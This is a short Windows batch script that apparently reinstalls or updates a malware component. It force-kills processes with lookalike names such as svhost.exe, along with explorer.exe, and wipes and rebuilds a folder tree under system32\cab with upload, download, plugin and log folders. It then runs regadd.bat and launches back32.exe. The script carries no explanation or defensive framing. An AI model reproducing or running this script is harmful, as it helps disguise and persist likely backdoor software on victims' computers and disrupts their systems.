@echo off
cd c:\
mkdir c:\txp
attrib -r -a -s -h c:\txp
mkdir c:\txp\dat
mkdir c:\txp\plugin
attrib -r -a -s -h %windir%\system32\cab
cd %windir%\system32\cab
echo a | copy copy\ c:\txp
echo a | copy dat\ c:\txp\dat
echo a | copy plugin\ c:\txp\plugin
cd c:\
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf svhost.exe
pv -kf service.exe
pv -kf service.exe
pv -kf service.exe
pv -kf service.exe
sleep 5
pv -kf explorer.exe
del %windir%\system32\cab\files\copy /F /S /Q
rmdir %windir%\system32\cab\files\sounds /S /Q
rmdir %windir%\system32\cab\files\logs /S /Q
rmdir %windir%\system32\cab\files\uploads /S /Q
rmdir %windir%\system32\cab\files\dat /S /Q
rmdir %windir%\system32\cab\files\log /S /Q
rmdir %windir%\system32\cab\files\plugin /S /Q
rmdir %windir%\system32\cab /S /Q
cd c:\txp
md %windir%\system32\cab
md %windir%\system32\cab\copy
md %windir%\system32\cab\log
md %windir%\system32\cab\logs
md %windir%\system32\cab\sounds
md %windir%\system32\cab\download
md %windir%\system32\cab\dat
md %windir%\system32\cab\plugin
md %windir%\system32\cab\uploads
call echo a | copy c:\txp %windir%\system32\cab
call echo a | copy c:\txp %windir%\system32\cab\copy
call echo a | copy c:\txp\dat %windir%\system32\cab\dat
call echo a | copy c:\txp\plugin %windir%\system32\cab\plugin
cd %windir%\system32\cab
CALL regadd.bat
cd %windir%\system32\cab
back32.exe service.exe
